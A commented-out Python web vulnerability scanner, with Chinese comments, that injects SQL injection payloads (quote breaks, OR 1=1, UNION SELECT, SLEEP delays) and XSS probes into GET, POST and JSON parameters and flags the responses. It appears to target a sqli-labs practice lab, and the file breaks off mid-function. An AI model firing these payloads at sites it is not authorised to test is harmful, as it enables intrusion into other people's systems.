# import requests
# import logging
# import sys
# import os
# import time
# import re
# import json
# from bs4 import BeautifulSoup
# from urllib.parse import urlparse,parse_qs,urljoin,urlunparse, urlencode

# sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# try:
#     from modules.request_manager import RateLimiter
#     from modules.request_queue import RequestQueueManager
#     from modules.request_sender import RequestSender
#     from modules.request_builder import RequestBuilder
#     from modules.response_parse import ResponseParse
#     from utils import load_config,load_sqli_config,load_xss_payload
# except ImportError as e:
#     print(f"导入模块失败: {e}")
#     sys.exit(1)

# class sampilescanner:
#     def __init__(self,config=None):
#         self.config=config or load_config()
#         self.session=requests.Session()
#         self.session.headers.update({
#             "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/115.0"
#         })
#         #获取日志记录器
#         self.logger=logging.getLogger('vuln_scanner.scan.port')

#         # 初始化速率限制器
#         self.rate_limiter=RateLimiter(
#             max_requests_per_second=self.config.get("max_requests_pre_second",10),
#             max_requests_per_minute=self.config.get("max_requests_per_minute",60)
#         )
        
#         # 初始化请求队列
#         self.request_queue = RequestQueueManager(
#             max_concurrent=self.config.get("max_concurrent_requests", 5),
#             max_queue_size=self.config.get("max_queue_size", 100),
#             rate_limiter=self.rate_limiter
#         )
        
#         # 初始化请求发送器
#         self.request_sender = RequestSender(
#             timeout=self.config.get("request_timeout", 10),
#             verify_ssl=self.config.get("verify_ssl", False),
#             user_agent=self.config.get("user_agent"),
#             proxies=self.config.get("proxies"),
#             max_retries=self.config.get("max_retries", 3)
#         )

#         # 初始化请求构造器和响应解析器
#         self.request_builder = RequestBuilder()
#         self.response_parser = ResponseParse()

#         #xss检测配置
#         self.xss_payloads=load_xss_payload()
#         self.xss_indicators=[
#             "<script>alert",
#             "<script>confirm",
#             "<script>prompt",
#             "javascript:",
#             "onerror=",
#             "onload=",
#             "onclick=",
#             "onmouseover=",
#             "<svg/onload=",
#             "<img src=x onerror=",
#             "<body onload=",
#             "<iframe src="
#         ]

#         #SQL注入配置
#         self.sql_config=load_sqli_config()

#         # 结果存储
#         self.results = {
#             "requests": [],
#             "responses": [],
#             "statistics":[],
#             'vulnerabilities': [],
#         }

#     def _collect_statistics(self):
#         """收集统计信息"""
#         self.results['statistics'] = {
#             'request_stats': self.request_sender.get_statistics(),
#             'queue_stats': self.request_queue.get_statistics(),
#             'rate_limit_stats': self.rate_limiter.get_stats(),
#             'scan_duration': f"{time.time():.2f}s"
#         }

#     def send_controlled_request(self, request_info):
#         """发送受控制的请求"""
#         def _make_request():
#             method = request_info.get('method', 'GET')
#             url = request_info.get('url')
            
#             if not url:
#                 raise ValueError("请求URL不能为空")
            
#             # 发送请求
#             response = self.request_sender.send_request(
#                 method=method,
#                 url=url,
#                 params=request_info.get('params'),
#                 data=request_info.get('data'),
#                 json_data=request_info.get('json'),
#                 headers=request_info.get('headers'),
#                 cookies=request_info.get('cookies'),
#                 allow_redirects=request_info.get('allow_redirects', True)
#             )
            
#             # 解析响应
#             parsed_response = self.response_parser.parse_response(
#                 response,
#                 extract_links=True,
#                 extract_forms=True,
#                 base_url=url
#             )
            
#             return {
#                 'request': request_info,
#                 'response': {
#                     'status_code': response.status_code,
#                     'url': str(response.url),
#                     'headers': dict(response.headers),
#                     'content_length': len(response.content)
#                 },
#                 'parsed': parsed_response
#             }
        
#         # 提交到队列
#         task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"
        
#         self.request_queue.submit(task_id, _make_request)
        
#         # 等待结果
#         try:
#             result = self.request_queue.get_result(task_id, timeout=30)
            
#             # 记录结果
#             self._record_request_result(result)
            
#             return result
            
#         except Exception as e:
#             # self.logger.error_logger.error(f"请求失败: {request_info.get('url')} - {e}")
#             return None

#     def _record_request_result(self, result):
#         """记录请求结果"""
#         if not result:
#             return
        
#         self.results['requests'].append(result['request']) 
#         self.results['responses'].append(result['response'])
#         self._collect_statistics()

#     def get_payloads_by_type(self,test_type,db_type=None):
#         """根据测试类型获取payload"""
#         payloads=[]
#         config=self.sql_config
#         #print(config)

#         if test_type=="error":
#             if db_type and db_type in config.get("payloads",{}):
#                 #获取指定数据库的错误型payload
#                 for payload in config['payloads'][db_type].get('error_based',[]):
#                     payloads.append({"payload":payload,"database":db_type})
#             else:
#                 #获取所有数据库的错误型payload
#                 for db in ["mysql","mssql","postgresql","oracle"]:
#                     if db in config.get("payloads",{}):
#                         for payload in config['payloads'][db].get('error_based',[]):
#                             payloads.append({"payload":payload,"database":db})
#                 #添加通用payload
#                 for payload in config['payloads'].get('generic_error_based',[]):
#                     payloads.append({"payload":payload,"database":"generic"})

#         elif test_type=="boolean":
#             if db_type and db_type in config.get("payloads",{}):
#                 #获取指定数据库的布尔型payload
#                 for payload in config['payloads'][db_type].get('boolean_based',[]):
#                     payloads.append({"payload":payload,"database":db_type})
#             else:
#                 #获取所有数据库的布尔型payload
#                 for db in ["mysql","mssql","postgresql","oracle"]:
#                     if db in config.get("payloads",{}):
#                         for payload in config['payloads'][db].get('boolean_based',[]):
#                             payloads.append({"payload":payload,"database":db})
                
#         elif test_type=="time":
#             if db_type and db_type in config.get("payloads",{}):
#                 #获取指定数据库的时间型payload
#                 for payload in config['payloads'][db_type].get('time_based',[]):
#                     payloads.append({"payload":payload,"database":db_type})
#             else:
#                 #获取所有数据库的时间型payload
#                 for db in ["mysql","mssql","postgresql","oracle"]:
#                     if db in config.get("payloads",{}):
#                         for payload in config['payloads'][db].get('time_based',[]):
#                             payloads.append({"payload":payload,"database":db})

#         elif test_type=="union":
#             payloads.append({"payload": "' UNION SELECT NULL --", "database": "generic"})
#             payloads.append({"payload": "' UNION SELECT NULL, NULL --", "database": "generic"})
#             payloads.append({"payload": "' UNION SELECT 1,2,3 --", "database": "generic"})
#             payloads.append({"payload": "' UNION SELECT 1,2,3,4 --", "database": "generic"})
        
#         return payloads
    
#     def detect_sql_vulnerability(self,response,test_type,payload,param_name,
#                                  original_value,url,method,db_type,response_time,**kwargs):
#         """检测各种类型的SQL注入漏洞"""
#         if not response or 'response' not in response:
#             return None
        
#         response_text=response['response'].get('text','').lower()
#         status_code=response['response'].get('status_code',0)

#         #1.错误型注入检测
#         if test_type=="error":
#             for db,indicators in self.sql_config.get("error_indicators",{}).items():
#                 for indicator in indicators:
#                     if indicator.lower() in response_text:
#                         return {
#                              "url": url,
#                             "type": f"SQL Injection (Error-Based - {db})",
#                             "payload": payload,
#                             "parameter": param_name,
#                             "original_value": original_value,
#                             "confidence": "高",
#                             "method": method,
#                             "database_type": db,
#                             "error_indicator": indicator,
#                             "response_code": status_code,
#                             "response_time": round(response_time, 2),
#                             "evidence": response_text[:500] if response_text else ""
#                         }

#         #2.布尔型注入检测
#         elif test_type=="boolean":
#             true_indicators=self.sql_config.get("boolean_indicators",{}).get("true_indicators",[])
#             false_indicators=self.sql_config.get("boolean_indicators",{}).get("false_indicators",[])

#             for indicator in true_indicators:
#                 if indicator.lower() in response_text:
#                     return {
#                         "url": url,
#                         "type": f"SQL Injection (Boolean-Based)",
#                         "payload": payload,
#                         "parameter": param_name,
#                         "original_value": original_value,
#                         "confidence": "中",
#                         "method": method,
#                         "database_type": db_type,
#                         "response_code": status_code,
#                         "boolean_indicator": indicator,
#                         "response_time": round(response_time, 2)
#                     }
        
#         #3.时间型注入检测
#         elif test_type=="time":
#             threshold=self.sql_config.get("time_based_threshold",3.0)
#             if response_time > threshold:
#                 return {
#                     "url": url,
#                     "type": f"SQL Injection (Time-Based)",
#                     "payload": payload,
#                     "parameter": param_name,
#                     "original_value": original_value,
#                     "confidence": "中",
#                     "method": method,
#                     "database_type": db_type,
#                     "response_code": status_code,
#                     "response_time": round(response_time, 2),
#                     "delay_threshold": threshold,
#                     "actual_delay": round(response_time, 2)
#                 }

#         #4.联合查询型注入检测
#         elif test_type=="union":
#             union_indicators=["null", "union", "select", "from", "where"]
#             indicator_count=sum(1 for ind in union_indicators if ind in response_text)

#             if indicator_count >= 3:
#                 return {
#                     "url": url,
#                     "type": f"SQL Injection (Union-Based)",
#                     "payload": payload,
#                     "parameter": param_name,
#                     "original_value": original_value,
#                     "confidence": "高",
#                     "method": method,
#                     "database_type": db_type,
#                     "response_code": status_code,
#                     "union_indicators_found": indicator_count,
#                     "response_time": round(response_time, 2)
#                 }
        
#         return None
    
#     def test_get_injection(self,base_url,params,test_types):
#         """测试GET请求注入"""
#         vulnerabilities=[]
#         for param_name, original_values in params.items():
#             if not original_values:
#                 continue

#             original_value=original_values[0]
#             print(f"测试参数：{param_name}={original_value}")

#             for test_type in test_types:
#                 payloads=self.get_payloads_by_type(test_type)
#                 for payload_info in payloads:
#                     payload=payload_info.get("payload","")
#                     db_type=payload_info.get("database","generic")

#                     #构建测试参数
#                     test_params=params.copy()
#                     test_params[param_name]=[f"{original_value}{payload}"]
                    
#                     #构建查询字符串
#                     guery_parts=[]
#                     for key,values in test_params.items():
#                         for value in values:
#                             guery_parts.append(f"{key}={value}")
#                     query_string="&".join(guery_parts)

#                     #构建测试URL
#                     test_url=f"{base_url}?{query_string}" if query_string else base_url
#                     print(f"    ↳ 类型: {test_type.upper()}, Payload: {payload[:30]}...")

#                     try:
#                         start_time=time.time()

#                         request_info={
#                             'method': 'GET',
#                              'url': test_url,
#                              'headers': self.sql_config.get("request_config",{}).get("headers",{}),
#                         }

#                         response=self.send_controlled_request(request_info)
#                         response_time=time.time()-start_time

#                         if response is None:
#                             continue

#                         #根据测试类型检测漏洞
#                         vuln= self.detect_sql_vulnerability(
#                             response,test_type,payload,param_name,
#                             original_value,test_url,"GET",db_type,response_time
#                         )

#                         if vuln:
#                             vulnerabilities.append(vuln)
#                             print(f"    ↳ 发现SQL注入漏洞！类型: {vuln['type']}")
#                     except Exception as e:
#                         print(f"    ↳ 请求失败: {e}")
#                         continue

#         return vulnerabilities

#     def test_post_injection(self,base_url,data,test_types):
#         """测试POST请求注入"""
#         vulnerabilities=[]
#         for param_name, original_value in data.items():
#             print(f"测试POST参数：{param_name}={original_value}")

#             for test_type in test_types:
#                 payloads=self.get_payloads_by_type(test_type)

#                 for payload_info in payloads:
#                     payload=payload_info.get("payload","")
#                     db_type=payload_info.get("database","generic")

#                     #构建测试参数
#                     test_data=data.copy()
#                     test_data[param_name]=f"{original_value}{payload}"

#                     try:
#                         start_time=time.time()

#                         request_info={
#                             'method': 'POST',
#                              'url': base_url,
#                              'headers': self.sql_config.get("request_config",{}).get("headers",{}),
#                              'data': test_data
#                         }

#                         response=self.send_controlled_request(request_info)
#                         response_time=time.time()-start_time

#                         if response is None:
#                             continue

#                         #根据测试类型检测漏洞
#                         vuln= self.detect_sql_vulnerability(
#                             response,test_type,payload,param_name,
#                             original_value,base_url,"POST",db_type,response_time,
#                             post_data=test_data
#                         )

#                         if vuln:
#                             vulnerabilities.append(vuln)
#                             print(f"    ↳ 发现SQL注入漏洞！类型: {vuln['type']}")
#                     except Exception as e:
#                         print(f"    ↳ 请求失败: {e}")
#                         continue

#         return vulnerabilities
    
#     def test_json_injection(self,base_url,data,test_types):
#         """测试JSON格式POST注入"""
#         vulnerabilities=[]
#         for param_name, original_value in data.items():
#             print(f"测试JSON参数：{param_name}={original_value}")

#             for test_type in test_types:
#                 payloads=self.get_payloads_by_type(test_type)

#                 for payload_info in payloads:
#                     payload=payload_info.get("payload","")
#                     db_type=payload_info.get("database","generic")

#                     #构建JSON数据
#                     json_data=data.copy()
#                     json_data[param_name]=f"{original_value}{payload}"

#                     try:
#                         headers=self.sql_config.get("request_config",{}).get("headers",{}).copy()
#                         headers['Content-Type'] = 'application/json'
                        
#                         start_time=time.time()

#                         request_info={
#                             'method': 'POST',
#                              'url': base_url,
#                              'headers': headers,
#                              'json': json_data
#                         }

#                         response=self.send_controlled_request(request_info)
#                         response_time=time.time()-start_time

#                         if response is None:
#                             continue

#                         #根据测试类型检测漏洞
#                         vuln= self.detect_sql_vulnerability(
#                             response,test_type,payload,param_name,
#                             original_value,base_url,"POST(JSON)",db_type,response_time,
#                             post_data=json_data
#                         )

#                         if vuln:
#                             vulnerabilities.append(vuln)
#                             print(f"    ↳ 发现SQL注入漏洞！类型: {vuln['type']}")
#                     except Exception as e:
#                         print(f"    ↳ 请求失败: {e}")
#                         continue

#         return vulnerabilities

#     def check_sql_injection(self,url_input,methods=["GET","POST"],test_types=None):
#         """
#         全面的SQL注入扫描
        
#         Args:
#             url_input: 单个URL字符串 或 URL列表
#             methods: 要测试的HTTP方法列表 ["GET", "POST"]
#             test_types: 要测试的注入类型列表 ["error", "boolean", "time", "union"]
        
#         Returns:
#             tuple: (漏洞列表, 扫描结果统计)
#         """

#         #设置默认测试类型
#         if test_types is None:
#             test_types=["error","boolean","time","union"]

#         vulnerabilities=[]

#         # 统一处理输入
#         if isinstance(url_input, str):
#             urls = [url_input]
#         elif isinstance(url_input, list):
#             urls = url_input
#         else:
#             raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")
        
#         print(f"🔍 开始SQL注入扫描，目标数量: {len(urls)}")
#         print(f"测试方法: {methods}")
#         print(f"测试类型: {test_types}")

#         for url in urls:
#             if not isinstance(url, str):
#                 print(f"跳过非字符串URL: {url}")
#                 continue

#             print(f"\n{'='*60}")
#             print(f"目标URL: {url}")

#             try:
#                 parsed_url=urlparse(url)
#                 base_url=f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
#                 #解析原始参数
#                 query_params=parse_qs(parsed_url.query)
#                 #为GET方法测试
#                 if "GET" in methods:
#                     print(f"\n[GET方法测试]")
#                     if query_params:
#                         vulns=self.test_get_injection(base_url,query_params,test_types)
#                         vulnerabilities.extend(vulns)
#                     else:
#                         #测试默认参数
#                         default_params={"id":["1"],"page":["1"],"user":["test"]}
#                         vulns=self.test_get_injection(base_url,default_params,test_types)
#                         vulnerabilities.extend(vulns)
                    
#                 #为POST方法测试
#                 if "POST" in methods:
#                     print(f"\n[POST方法测试]")
#                     #尝试从GET参数构建POST数据
#                     post_data={}
#                     for key,values in query_params.items():
#                         if values:
#                             post_data[key]=values[0]

#                     if not post_data:
#                         post_data={"username":"admin","password":"password","id":"1"}

#                     vulns=self.test_post_injection(base_url,post_data,test_types)
#                     vulnerabilities.extend(vulns)

#                     #测试JSON格式POST
#                     if "json" in test_types:
#                         vulns=self.test_json_injection(base_url,post_data,test_types)
#                         vulnerabilities.extend(vulns)

#                 #测试头部注入
#                 if "headers" in test_types:
#                     print(f"\n[头部注入测试] - 未实现")

#             except Exception as e:
#                 print(f"❌ 处理URL时出错 {url}: {e}")
#                 continue

#         #更新统计信息
#         self.update_sql_statistics(vulnerabilities)

#         print(f"\n{'='*60}")
#         print(f"扫描完成！")
#         print(f"总测试目标: {len(urls)}")
#         print(f"发现漏洞: {len(vulnerabilities)}")

#         #输出漏洞信息
#         if vulnerabilities:
#             print(f"\n漏洞详情:")
#             for i,vuln in enumerate(vulnerabilities,1):
#                 print(f"{i}. URL: {vuln['url']}")
#                 print(f"   类型: {vuln['type']}")
#                 print(f"   参数: {vuln.get('parameter', 'N/A')}")
#                 print(f"   方法: {vuln['method']}")
#                 print(f"   可信度: {vuln['confidence']}")
#                 if 'error_indicator' in vuln:
#                     print(f"   错误指示: {vuln['error_indicator']}")
#                 print()

#         #更新全局结果
#         self.results['vulnerabilities'].extend(vulnerabilities)

#         return vulnerabilities, self.results
    
#     def update_sql_statistics(self, vulnerabilities):
#         """更新SQL注入统计信息"""
#         if not hasattr(self.results,'sql_statistics'):
#             self.results['sql_statistics'] = {
#                 "total_tested": 0,
#                 "vulnerable_urls": 0,
#                 "by_type": {},
#                 "by_database": {},
#                 "by_method": {}
#             }

#         stats=self.results['sql_statistics']

#         #获取唯一的URL列表
#         unique_urls=set(vuln["url"] for vuln in vulnerabilities)
#         stats["total_tested"]=len(unique_urls)
#         stats["vulnerable_urls"]=len(unique_urls)

#         #按类型统计
#         for vuln in vulnerabilities:
#             vuln_type=vuln["type"].split("(")[-1].split(")")[0] if "(" in vuln["type"] else vuln["type"]
#             stats["by_type"][vuln_type]=stats["by_type"].get(vuln_type,0)+1

#             #按数据库类型统计
#             db_type=vuln.get("database_type","unknown")
#             stats["by_database"][db_type]=stats["by_database"].get(db_type,0)+1

#             #按请求方法统计
#             method=vuln.get("method","unknown")
#             stats["by_method"][method]=stats["by_method"].get(method,0)+1
            

#     # def check_sql_injection(self, url_input):
#     #     """
#     #     SQL注入扫描
#     #     支持单个URL字符串或URL列表

#     #     Args:
#     #         url_input: 单个URL字符串 或 URL列表

#     #     Returns:
#     #         list: 发现的漏洞列表
#     #     """
#     #     # SQL注入测试载荷
#     #     testpayloads = [
#     #         "'",
#     #         "\"",
#     #         "' OR '1'='1",
#     #         "\" OR \"1\"=\"1",
#     #         "' OR '1'='1' --",
#     #         "' OR 1=1 --",
#     #         "' UNION SELECT NULL --",
#     #         "1' AND SLEEP(5) --",
#     #         "1' OR '1'='1",
#     #         "-1' UNION SELECT 1,2,3 --",
#     #         "admin' --",
#     #         "1' ORDER BY 1 --",
#     #         "1' AND 1=2 UNION SELECT 1,2,3 --"
#     #     ]

#     #     # SQL错误指示器（全部小写以便比较）
#     #     error_indicators = [
#     #         "you have an error in your sql syntax",
#     #         "warning: mysql",
#     #         "sql syntax",
#     #         "mysql_fetch",
#     #         "syntax error",
#     #         "mysql_num_rows",
#     #         "unclosed quotation mark",
#     #         "quoted string not properly terminated",
#     #         "mysql error",
#     #         "sql server",
#     #         "ora-",
#     #         "postgresql",
#     #         "sqlite",
#     #         "odbc",
#     #         "jdbc",
#     #         "pdo",
#     #         "sql command",
#     #         "division by zero",
#     #         "invalid query",
#     #         "unknown column",
#     #         "table doesn't exist"
#     #     ]

#     #     vulnerabilities = []

#     #     # 统一处理输入：将单个URL转换为列表
#     #     if isinstance(url_input, str):
#     #         urls = [url_input]
#     #     elif isinstance(url_input, list):
#     #         urls = url_input
#     #     else:
#     #         raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")

#     #     # 对每个URL进行测试
#     #     for url in urls:
#     #         # 确保URL是字符串
#     #         if not isinstance(url, str):
#     #             print(f"跳过非字符串URL: {url}")
#     #             continue
            
#     #         print(f"\n开始测试URL: {url}")

#     #         try:
#     #             # 解析URL
#     #             parsed_url = urlparse(url)
#     #             base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

#     #             # 提取查询参数
#     #             query_params = parse_qs(parsed_url.query)

#     #             # 如果没有查询参数，使用默认参数'id'
#     #             if not query_params:
#     #                 print(f"URL中没有查询参数，使用默认参数'id'")
#     #                 param_to_test = {'id': ['1']}
#     #                 params_to_test = [('id', '1')]
#     #             else:
#     #                 param_to_test = query_params
#     #                 params_to_test = []
#     #                 for key, values in query_params.items():
#     #                     if values:
#     #                         params_to_test.append((key, values[0]))

#     #             print(f"  基础URL: {base_url}")
#     #             print(f"  发现参数: {list(param_to_test.keys())}")

#     #             # 对当前URL测试所有payload
#     #             for payload in testpayloads:
#     #                 try:
#     #                     # 为每个参数创建测试URL
#     #                     for param_name, original_value in params_to_test:
#     #                         # 复制原始参数
#     #                         test_params = param_to_test.copy()

#     #                         # 对当前测试参数添加payload
#     #                         if param_name in test_params:
#     #                             # 保留原始值，加上payload
#     #                             test_value = f"{original_value}{payload}"
#     #                             test_params[param_name] = [test_value]

#     #                         # 构建查询字符串
#     #                         query_string = ""
#     #                         for key, values in test_params.items():
#     #                             for value in values:
#     #                                 if query_string:
#     #                                     query_string += "&"
#     #                                 query_string += f"{key}={value}"

#     #                         # 构建完整测试URL
#     #                         test_url = f"{base_url}?{query_string}"

#     #                         print(f"  测试payload: {payload}")
#     #                         print(f"  测试参数: {param_name}")
#     #                         print(f"  请求URL: {test_url}")

#     #                         # 准备请求信息
#     #                         request_info = {
#     #                             'method': 'GET',
#     #                             'url': test_url,
#     #                             'headers': {},
#     #                             'params': {}  # 参数已经在URL中，不需要单独传
#     #                         }

#     #                         # 发送请求
#     #                         response = self.send_controlled_request(request_info)

#     #                         if response is None:
#     #                             if hasattr(self.logger, 'error'):
#     #                                 self.logger.error(f"请求失败，响应为None: {test_url}")
#     #                             else:
#     #                                 print(f"请求失败，响应为None: {test_url}")
#     #                             continue
                            
#     #                         # 检查解析的内容是否存在
#     #                         if 'parsed' not in response:
#     #                             error_msg = f"响应中没有parsed字段: {test_url}"
#     #                             if hasattr(self.logger, 'error'):
#     #                                 self.logger.error(error_msg)
#     #                             else:
#     #                                 print(error_msg)
#     #                             continue
                            
#     #                         # 获取响应体
#     #                         body = str(response['parsed']['parsed_content'])

#     #                         # 检查是否有SQL错误指示器
#     #                         found_error = False
#     #                         body_lower = body.lower()

#     #                         for error in error_indicators:
#     #                             if error in body_lower:
#     #                                 vulnerabilities.append({
#     #                                     "url": url,  # 原始URL
#     #                                     "type": "SQL Injection",
#     #                                     "payload": payload,
#     #                                     "parameter": param_name,
#     #                                     "original_value": original_value,
#     #                                     "confidence": "低",
#     #                                     "tested_url": test_url,
#     #                                     "error_indicator": error,
#     #                                     "response_code": response['response']['status_code'],
#     #                                     "method": "GET"
#     #                                 })
#     #                                 found_error = True
#     #                                 print(f"  发现SQL注入漏洞！参数: {param_name}, 错误指示: {error[:50]}...")
#     #                                 break
                                
#     #                         if not found_error:
#     #                             # 也可以检查其他SQL注入特征
#     #                             # 1. 检查响应时间延迟（如果有时间戳可以计算）
#     #                             # 2. 检查布尔盲注的特征
#     #                             # 3. 检查联合查询的特征

#     #                             # 简单的布尔盲注检测：检查响应长度变化
#     #                             # 这里可以添加更复杂的逻辑

#     #                             # 暂时标记为未发现
#     #                             print(f"  未发现漏洞 (参数: {param_name})")

#     #                 except requests.exceptions.Timeout:
#     #                     print(f"  请求超时: {url}")
#     #                     continue
#     #                 except requests.exceptions.RequestException as e:
#     #                     print(f"  请求错误: {e}")
#     #                     continue
#     #                 except Exception as e:
#     #                     print(f"  其他错误: {e}")
#     #                     continue
                    
#     #         except Exception as e:
#     #             print(f"解析URL时出错: {e}")
#     #             continue
            
#     #     # 统计结果
#     #     print(f"\n扫描完成！共发现 {len(vulnerabilities)} 个SQL注入漏洞")
#     #     scan_results=self.results
#     #     return vulnerabilities,scan_results

#     # def check_sql_injection(self, url_input):
#     #     """
#     #     SQL注入扫描
#     # 支持单个URL字符串或URL列表
    
#     # Args:
#     #     url_input: 单个URL字符串 或 URL列表
    
#     # Returns:
#     #     list: 发现的漏洞列表
#     #     """ 
#     # # SQL注入测试载荷
#     #     testpayloads = [
#     #         "'",
#     #         "\"",
#     #         "' OR '1'='1",
#     #         "\" OR \"1\"=\"1",
#     #     ]

#     #     # SQL错误指示器（全部小写以便比较）
#     #     error_indicators = [
#     #         "you have an error in your sql syntax",
#     #         "warning: mysql",
#     #         "sql syntax",
#     #         "mysql_fetch",
#     #         "syntax error",
#     #         "mysql_num_rows",
#     #         "unclosed quotation mark after the character string",
#     #         "quoted string not properly terminated",
#     #         "welcome",
#     #         "dhakkan"
#     #     ]

#     #     vulnerabilities = []

#     #     # 统一处理输入：将单个URL转换为列表
#     #     if isinstance(url_input, str):
#     #         urls = [url_input]
#     #     elif isinstance(url_input, list):
#     #         urls = url_input
#     #     else:
#     #         raise TypeError(f"url_input 必须是字符串或列表，但得到 {type(url_input)}")

#     #     # 对每个URL进行测试
#     #     for url in urls:
#     #         # 确保URL是字符串
#     #         if not isinstance(url, str):
#     #             print(f"跳过非字符串URL: {url}")
#     #             continue
            
#     #         print(f"\n开始测试URL: {url}")

#     #         # 对当前URL测试所有payload
#     #         for payload in testpayloads:
#     #             try:
#     #                 # 构建测试 URL（保证 base 有结尾斜杠再 join）
#     #                 base = url if url.endswith('/') else url + '/'
#     #                 test_url = urljoin(base, 'sqli-labs-master/Less-5/')
#     #                 params = {'id': f"1{payload}"}

#     #                 print(f"  测试payload: {payload}")
#     #                 print(f"  请求URL: {test_url}")
#     #                 print(f"  参数: {params}")

#     #                 if test_url:
#     #                     request_info={
#     #                         'method' : 'GET',
#     #                         'url':test_url,
#     #                         'headers':{},
#     #                         'params' : params
#     #                     }
#     #                 response=self.send_controlled_request(request_info)
                    
#     #                 if response is None:
#     #                 # 修复logger调用 - 根据你的实际logger结构调整
#     #                     if hasattr(self.logger, 'error'):
#     #                         self.logger.error(f"请求失败，响应为None: {url}")                        
#     #                     else:
#     #                         print(f"请求失败，响应为None: {url}")
#     #                     continue
                
#     #                 # 检查解析的内容是否存在
#     #                 if 'parsed' not in response:
#     #                     error_msg = f"响应中没有parsed字段: {url}"
#     #                     if hasattr(self.logger, 'error'):
#     #                         self.logger.error(error_msg)
#     #                     else:
#     #                         print(error_msg)
#     #                     continue
#     #                 body=str(response['parsed']['parsed_content'])
#     #                 #print(body)

#     #                 # response = self.session.get(test_url, params=params, timeout=5)#修改成包，利用受控制的请求发包
#     #                 # body = response.text.lower()
#     #                 # print(str(body))
#     #                 # print("---------------------------------")
#     #                 # print(body)
#     #                 # 检查是否有SQL错误指示器
#     #                 found_error = False
#     #                 for error in error_indicators:
#     #                     if error in str(body).lower():
#     #                         vulnerabilities.append({
#     #                             "url": url,  # 原始URL
#     #                             "type": "SQL Injection",
#     #                             "payload": payload,
#     #                             "confidence": "低",
#     #                             "tested_url": test_url,
#     #                             "params": params,
#     #                             "error_indicator": error,
#     #                             "response_code": response['response']['status_code']
#     #                         })
#     #                         found_error = True
#     #                         print(f"  发现SQL注入漏洞！错误指示: {error}")
#     #                         break
                        
#     #                 if not found_error:
#     #                     print(f"  未发现漏洞")

#     #             except requests.exceptions.Timeout:
#     #                 print(f"  请求超时: {url}")
#     #                 continue
#     #             except requests.exceptions.RequestException as e:
#     #                 print(f"  请求错误: {e}")
#     #                 continue
#     #             except Exception as e:
#     #                 print(f"  其他错误: {e}")
#     #                 continue
                
#     #     # 统计结果
#     #     print(f"\n扫描完成！共发现 {len(vulnerabilities)} 个SQL注入漏洞")
#     #     scan_results=self.results
#     #     return vulnerabilities,scan_results

#     def _extract_parameters(self, url):
#         """从URL中提取参数"""
#         parsed = urlparse(url)
#         params = parse_qs(parsed.query)
        
#         # 转换为单个值的字典（而不是列表）
#         single_params = {}
#         for key, value in params.items():
#             if value:
#                 single_params[key] = value[0]
        
#         return single_params

#     def _detect_xss_in_response(self, response_text, payload, original_value=None):
#         """检测响应中是否存在XSS漏洞
        
#         Args:
#             response_text: 响应文本
#             payload: 使用的payload
#             original_value: 参数原始值（用于对比）
            
#         Returns:
#             tuple: (是否发现漏洞, 置信度, 详细信息)
#         """
#         response_lower = response_text.lower()
#         payload_lower = payload.lower()
        
#         # 1. 检查payload是否在响应中反射
#         if payload_lower in response_lower:
#             # 检查是否被HTML编码
#             encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
#             if encoded_payload.lower() not in response_lower:
#                 # payload存在且没有被HTML编码，可能是漏洞
                
#                 # 检查payload是否出现在危险上下文中
#                 for indicator in self.xss_indicators:
#                     if indicator in payload_lower and indicator in response_lower:
#                         return True, "高", f"发现XSS payload在响应中反射且未编码，出现在危险上下文: {indicator}"
                
#                 # 检查payload是否出现在script标签中
#                 if '<script' in payload_lower and '<script' in response_lower:
#                     script_start = response_lower.find('<script')
#                     script_end = response_lower.find('</script>', script_start)
#                     if script_start != -1 and script_end != -1:
#                         script_content = response_text[script_start:script_end]
#                         if payload in script_content:
#                             return True, "高", "payload出现在<script>标签中"
                
#                 # 检查payload是否出现在事件处理器中
#                 events = ['onload=', 'onclick=', 'onmouseover=', 'onerror=']
#                 for event in events:
#                     if event in payload_lower:
#                         event_start = response_lower.find(event)
#                         if event_start != -1:
#                             # 检查事件处理器是否被正确转义
#                             context = response_text[max(0, event_start-50):min(len(response_text), event_start+100)]
#                             if payload in context:
#                                 return True, "中", f"payload出现在事件处理器中: {event}"
                
#                 return True, "低", "payload在响应中反射但未编码"
        
#         # 2. 检查payload是否被部分反射
#         payload_parts = payload.split()
#         if len(payload_parts) > 1:
#             reflected_parts = [part for part in payload_parts if part.lower() in response_lower]
#             if len(reflected_parts) >= len(payload_parts) * 0.5:  # 超过一半的部分被反射
#                 return True, "中", f"payload部分被反射: {reflected_parts}"
        
#         return False, "无", "未发现XSS漏洞"

#     def check_xss(self, url_input, method='GET', data=None, cookies=None, headers=None):
#         """完整的XSS扫描功能
        
#         Args:
#             url_input: 单个URL字符串或URL列表
#             method: 请求方法 (GET, POST)
#             data: POST数据 (字典格式)
#             cookies: cookie字典
#             headers: 请求头字典
            
#         Returns:
#             tuple: (漏洞列表, 扫描结果)
#         """
#         vulnerabilities = []
        
#         # 统一处理输入：将单个URL转换为列表
#         if isinstance(url_input, str):
#             urls = [url_input]
#         elif isinstance(url_input, list):
#             urls = url_input
#         else:
#             raise TypeError(f"url_input必须是字符串或列表，但得到{type(url_input)}")
        
#         for url in urls:
#             if not isinstance(url, str):
#                 print(f"跳过非字符串URL: {url}")
#                 continue
            
#             print(f"\n[+] 开始XSS扫描URL: {url}")
            
#             # 提取URL中的参数
#             url_params = self._extract_parameters(url)
            
#             # 准备要测试的参数
#             test_params = {}
            
#             # 如果提供了POST数据，则测试POST参数
#             if method.upper() == 'POST' and data:
#                 test_params = data.copy()
#             # 否则测试URL参数
#             elif url_params:
#                 test_params = url_params.copy()
#             # 如果没有参数，使用默认测试参数
#             else:
#                 test_params = {'test': 'default'}
            
#             if not test_params:
#                 print(f"[-] URL {url} 没有可测试的参数")
#                 continue
            
#             print(f"[*] 发现 {len(test_params)} 个参数: {list(test_params.keys())}")
            
#             # 测试每个参数
#             for param_name, original_value in test_params.items():
#                 print(f"\n[*] 测试参数: {param_name}")
                
#                 for payload_idx, payload in enumerate(self.xss_payloads):
#                     try:
#                         # 构建请求
#                         if method.upper() == 'POST':
#                             # 对于POST请求，将payload注入到data中
